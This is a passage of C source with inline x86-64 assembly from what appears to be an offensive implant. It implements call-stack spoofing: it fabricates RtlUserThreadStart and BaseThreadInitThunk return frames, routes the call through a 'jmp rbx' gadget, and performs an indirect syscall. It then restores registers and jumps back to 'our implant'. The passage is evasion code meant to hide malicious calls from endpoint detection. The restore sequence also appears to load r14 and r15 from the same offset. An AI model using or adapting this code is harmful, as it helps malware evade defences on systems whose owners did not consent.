        "push 0x0\n"                          // Push 0 to terminate stackwalk after RtlUserThreadStart stack frame
        // RtlUserThreadStart + 0x14  frame
        "sub rsp,   [rdi + 0x38]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
        "mov r11,   [rdi + 0x40]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_return_address)   return address
        "mov [rsp], r11\n"
        // BaseThreadInitThunk + 0x21 frame
        "sub rsp,   [rdi + 0x20]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size
        "mov r11,   [rdi + 0x28]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_return_address)   return address
        "mov [rsp], r11\n"
        // ThreadStartAddress  frame
        // "sub rsp,   [rdi + 0x80]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_stack_frame_size) stack frame size
        // "mov r11,   [rdi + 0x88]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_return_address)   return address
        // "mov [rsp], r11\n"`
        // Gadget frame
        "sub rsp,   [rdi + 0x30]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size
        "mov r11,   [rdi + 0x50]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_return_address)    return address
        "mov [rsp], r11\n"
        // Adjusting the param struct for the fixup
        "mov r11,          rsi\n"             // Copying function to call into r11
        "mov [rdi + 0x08], r12\n"             // Spoof_Struct.original_return_address
        "mov [rdi + 0x10], rbx\n"             // Spoof_Struct.rbx - save original rbx to restore later
        "lea rbx,          [rip + fixup]\n"   // Fixup address is moved into rbx
        "mov [rdi],        rbx\n"             // Fixup member now holds the address of Fixup
        "mov rbx,          rdi\n"             // Address of param struct (Fixup) is moved into rbx
        // For indirect syscalls
        "mov r10, rcx\n"           // RCX = API Call Argument # 1
        "mov rax, [rdi + 0x48]\n"
        "jmp r11\n"                // jump to Spoof Struct -> Pointer to API Call
        "fixup:\n" // retore the stack of our implant and return to it
        "mov rcx, rbx\n"
        //"add rsp, 0x200\n"              // adjust RSP frame
        "add rsp, [rbx + 0x30]\n"         // Spoof_Struct.gadget_stack_frame_size
        // "add rsp, [rbx + 0x80]\n"      // Spoof_Struct.frame_2_stack_frame_size
        "add rsp, [rbx + 0x20]\n"         // Spoof_Struct.frame_1_stack_frame_size
        "add rsp, [rbx + 0x38]\n"         // Spoof_Struct.frame_0_stack_frame_size
        "mov rbx, [rcx + 0x10]\n"         // restore original rbx
        "mov rdi, [rcx + 0x18]\n"         // restore original rdi
        "mov rsi, [rcx + 0x58]\n"         // restore original rsi
        "mov r12, [rcx + 0x60]\n"         // restore original r12
        "mov r13, [rcx + 0x68]\n"         // restore original r13
        "mov r14, [rcx + 0x78]\n"         // restore original r14
        "mov r15, [rcx + 0x78]\n"         // restore original r15
        "mov rcx, [rcx + 0x08]\n"         // Spoof_Struct.original_return_address
        "jmp rcx\n"    // return to implant


        "add: \n"
        "add rcx, rdx \n"
        "xchg rax, rcx \n"
        "ret \n"
        );

